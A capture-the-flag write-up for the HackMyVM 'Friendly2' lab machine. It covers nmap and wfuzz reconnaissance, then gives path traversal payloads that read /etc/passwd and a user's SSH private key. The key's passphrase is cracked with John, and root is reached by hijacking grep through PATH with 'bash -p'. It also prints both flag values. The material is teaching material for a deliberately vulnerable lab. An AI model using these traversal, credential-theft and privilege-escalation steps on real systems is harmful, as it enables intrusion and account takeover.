
# Friendly2 — HackMyVM Writeup

<img width="670" alt="Friendly2 banner" src="https://github.com/user-attachments/assets/27dc3846-205e-41e3-b075-e69d4355f647" />

Continuing the series with the **Friendly2** machine.

---

## 1. Reconnaissance

### Step 1 — Find the target's IP address

```bash
sudo arp-scan -I eth0 --localnet
```

**Result:**

```
192.168.15.11   08:00:27:0c:8f:a4   PCS Systemtechnik GmbH
```

### Step 2 — Confirm the OS with a ping

```bash
ping 192.168.15.11
```

```
┌──(clandhacker㉿kali)-[~/Desktop]
└─$ ping 192.168.15.11
PING 192.168.15.11 (192.168.15.11) 56(84) bytes of data.
64 bytes from 192.168.15.11: icmp_seq=1 ttl=64 time=1.60 ms
64 bytes from 192.168.15.11: icmp_seq=2 ttl=64 time=1.69 ms
64 bytes from 192.168.15.11: icmp_seq=3 ttl=64 time=1.95 ms
64 bytes from 192.168.15.11: icmp_seq=4 ttl=64 time=2.01 ms
^C
--- 192.168.15.11 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 1.595/1.808/2.005/0.171 ms
```

Just like with Friendly1, the **TTL of 64** confirms this is a Linux machine.

### Step 3 — Set up the working directory and scan with Nmap

```bash
mkdir Friendly2
cd Friendly2
sudo nmap -p- -sS -sC -sV -n -Pn --min-rate 5000 -vvv 192.168.15.11 -oN results.txt
```

**Result:**

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 18:29 -0500

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 74:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 (RSA)
|   256 16:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 (ECDSA)
|   256 65:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 (ED25519)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.56 ((Debian))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Servicio de Mantenimiento de Ordenadores
MAC Address: 08:00:27:0C:8F:A4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open ports:

- **22/TCP** — SSH (OpenSSH 8.4p1)
- **80/TCP** — Apache 2.4.56, hosting a site titled *"Servicio de Mantenimiento de Ordenadores"*

<img width="1516" alt="Website homepage" src="https://github.com/user-attachments/assets/033ed806-af26-4454-8662-db69e02e920a" />

### Step 4 — Directory brute-force with Wfuzz

```bash
wfuzz -c --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 'http://192.168.15.11/FUZZ'
```

**Relevant results:**

```
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000121:   301        9 L      28 W       314 Ch      "tools"
000000287:   301        9 L      28 W       315 Ch      "assets"
```

Wfuzz found two directories: `tools` and `assets`. We'll start by browsing `/tools`.

<img width="1588" alt="Tools directory" src="https://github.com/user-attachments/assets/1b77510b-1a8b-4856-a7f1-481cf5ed895e" />

---

## 2. Exploring Vulnerabilities

### Step 1 — Inspect the page source

Right-click → *View Page Source* to inspect the site's code.

<img width="1189" alt="Page source inspection" src="https://github.com/user-attachments/assets/1d1d8c51-f32a-4c9f-b808-dcf5c490b98f" />

We find something interesting: a parameter that includes `doc=` in the URL. Whenever a page loads content through a parameter like this, it's a strong candidate for a **Path Traversal / Local File Inclusion (LFI)** vulnerability.

First, we confirm the page exists:

```
check_if_exist.php?doc=keyboard.html
```

<img width="1383" alt="check_if_exist.php confirmed" src="https://github.com/user-attachments/assets/104da5e8-44a9-46c3-9ccd-ea72dfda60a9" />

### Step 2 — Exploit the Path Traversal

We replace `keyboard.html` with a traversal payload to walk up the directory tree and read `/etc/passwd`:

```
check_if_exist.php?doc=../../../../../../etc/passwd
```

<img width="1562" alt="/etc/passwd contents leaked" src="https://github.com/user-attachments/assets/d7862ba5-5334-4378-b339-da3362334158" />

Using `Ctrl + U` to view the raw source makes the output easier to read. We spot a user called **`gh0st`**.

Since we have local file inclusion, we can try to pull that user's SSH private key directly:

```
check_if_exist.php?doc=../home/gh0st/.ssh/id_rsa
```

It works — we successfully leak the private key.

<img width="718" alt="id_rsa leaked via LFI" src="https://github.com/user-attachments/assets/20adcd26-9f5b-472f-9e71-49b679135b52" />

### Step 3 — Crack the private key's passphrase

Save the leaked key locally and fix its permissions:

```bash
nano id_rsa    # paste the leaked key content here
chmod 600 id_rsa
```

Attempting to connect asks for a passphrase:

```
┌──(clandhacker㉿kali)-[~/Desktop/Friendly2]
└─$ ssh -i id_rsa gh0st@192.168.15.11
Enter passphrase for key 'id_rsa':
```

Convert the key into a crackable hash with `ssh2john`:

```bash
ssh2john id_rsa > hash
john hash
```

That alone didn't yield a match, so we fall back to a dictionary attack using **rockyou.txt**:

```bash
locate rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show hash
```

**Result:**

```
id_rsa:celtic

1 password hash cracked, 0 left
```

The passphrase is **`celtic`**.

### Step 4 — SSH in as gh0st

```bash
ssh -i id_rsa gh0st@192.168.15.11
# passphrase: celtic
```

```
-bash-5.1$ whoami
gh0st
-bash-5.1$ ls
user.txt
-bash-5.1$ cat user.txt
ab0366431e2d8ff563cf34272e3d14bd
```

**User flag:** `ab0366431e2d8ff563cf34272e3d14bd`

---

## 3. Privilege Escalation

### Step 1 — Check sudo permissions

```bash
sudo -l
```

```
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
```

We can run `/opt/security.sh` as root, with no password required.

### Step 2 — Inspect the script

```bash
cat /opt/security.sh
```

```bash
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

The script calls both `grep` and `tr` **without an absolute path**. Since the script doesn't hardcode `/bin/grep`, whichever `grep` appears first in `$PATH` will be used — this opens the door for a **PATH hijacking** attack.

### Step 3 — PATH hijack via a malicious `grep`

Create a fake `grep` binary in a writable, world-accessible directory (`/tmp`):

```bash
cd /tmp
nano grep
```

<img width="907" alt="Malicious grep script" src="https://github.com/user-attachments/assets/3f4f1e8e-eabe-43cb-86c2-2ff515f30b9d" />

Inside it, drop into a root shell (`bash -p` preserves privileges):

```bash
#!/bin/bash
bash -p
```

Make it executable:

```bash
chmod 777 grep
```

Check the current `$PATH`:

```bash
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/games
```

Run the vulnerable script, but prepend `/tmp` (our current directory) to `$PATH` so our fake `grep` is found first:

```bash
sudo PATH=.:$PATH /opt/security.sh
```

When prompted, type any string containing a special character (this forces the script to call `grep`, which now runs *our* malicious version instead of the real one):

```
Enter the string to encode:
hofef!
The string cannot contain special characters.
```

Our fake `grep` script drops us into a **root shell**:

```
bash-5.1# whoami
root
```

### Step 4 — Capture the root flag

```bash
ls -la /
```

A hidden directory named `...` (three dots) stands out among the root-level folders:

```bash
cd /...
ls
cat ebbg.txt
```

**Result:**

```
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq
```

The flag is encoded with a substitution cipher (the same ROT-style shift used by `security.sh` itself). Decoding it gives:

```
98199a723d0f44f6ef39e33685d8cabd
```

**Root flag:** `98199a723d0f44f6ef39e33685d8cabd`

---

## Summary

| Stage | Technique |
|-------|-----------|
| Recon | `arp-scan`, `ping`, `nmap`, `wfuzz` directory brute-force |
| Initial foothold | Path Traversal / LFI (`doc=` parameter) → leaked `gh0st`'s SSH private key |
| Credential cracking | `ssh2john` + `john` with `rockyou.txt` → passphrase `celtic` |
| Privilege escalation | PATH hijack on `/opt/security.sh` (missing absolute path for `grep`) |

| Flag | Location | Value |
|------|----------|-------|
| **User flag** | `/home/gh0st/user.txt` | `ab0366431e2d8ff563cf34272e3d14bd` |
| **Root flag** | `/...` (hidden root-level dir), `ebbg.txt` (cipher-encoded) | `98199a723d0f44f6ef39e33685d8cabd` |

*Machine rooted — full cycle complete: recon → LFI exploitation → credential cracking → PATH-hijack privilege escalation.*
















